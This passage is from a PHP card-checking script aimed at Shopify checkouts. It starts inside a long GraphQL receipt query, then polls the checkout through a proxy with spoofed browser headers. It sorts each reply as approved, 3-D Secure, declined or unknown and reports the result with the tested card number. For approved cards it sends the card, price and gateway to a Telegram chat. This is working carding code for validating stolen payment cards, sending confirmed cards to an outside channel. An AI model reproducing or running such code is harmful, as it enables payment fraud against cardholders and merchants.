ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name deposit __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
    'variables' => [
        'receiptId' => $recipt_id,
        'sessionToken' => $x_checkout_one_session_token
    ],
    'operationName' => 'PollForReceipt'
]);

$ch = curl_init();
$ch = applyProxyToCurl($ch, $proxy);
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US',
    'content-type: application/json',
    'origin: '.$urlbase,
    'priority: u=1, i',
    'referer: '.$urlbase,
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: '.$ua,
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);
$response5 = curl_exec($ch);

if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll;
    } else {
        $err = 'cURL error: ' . curl_error($ch);
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $totalamt,
        ]);
        echo $result;
        exit;
    }
}

// Check response
if (
    strpos($response5, $checkouturl . '/thank_you') ||
    strpos($response5, $checkouturl . '/post_purchase') ||
    strpos($response5, 'Your order is confirmed') ||
    strpos($response5, 'Thank you') ||
    strpos($response5, 'ThankYou') ||
    strpos($response5, 'thank_you') ||
    strpos($response5, 'success') ||
    strpos($response5, 'classicThankYouPageUrl') ||
    strpos($response5, '"__typename":"ProcessedReceipt"') ||
    strpos($response5, 'SUCCESS')
) {
    $gateway = 'Normal'; // You should extract gateway from response
    $err = 'Thank You ' . $totalamt;
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
    ]);
    
    // Send Telegram notification
    $kb_s = [
        'caption' => "
Card: $cc1
Response: $err
Gateway: $gateway
Price: $totalamt
        ",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "Dev",
                        'url' => 'https://t.me/amanpandey1212'
                    ]
                ]
            ]
        ])
    ];
    $chat_id1 = ''; // Add your chat ID
    output('sendVideo', array_merge([
        'chat_id' => '-id',
        'video' => 'https://t.me/amanpan/1'
    ], $kb_s));
    
    echo $result;
    exit;
} elseif (strpos($response5, 'CompletePaymentChallenge') || strpos($response5, '/stripe/authentications/')) {
    $err = '3D_AUTHENTICATION';
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price' => $totalamt,
        'Gateway' => 'Normal',
        'cc' => $cc1,
    ]);
    echo $result;
    exit;
} elseif (isset(json_decode($response5)->data->receipt->processingError->code)) {
    $err = json_decode($response5)->data->receipt->processingError->code;
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price' => $totalamt,
        'Gateway' => 'Normal',
        'cc' => $cc1,
    ]);
    echo $result;
    exit;
} elseif (strpos($response5, '"__typename":"WaitingReceipt"') || strpos($response5, '"__typename":"ProcessingReceipt"')) {
    sleep(5);
    goto poll;
} else {
    $err = 'Unknown response: ' . substr($response5, 0, 200);
    $result = json_encode([
        'Response' => $err,
        'Status' => 'false',
        'Price' => $totalamt,
        'cc' => $cc1,
    ]);
    echo $result;
    exit;
}
?>
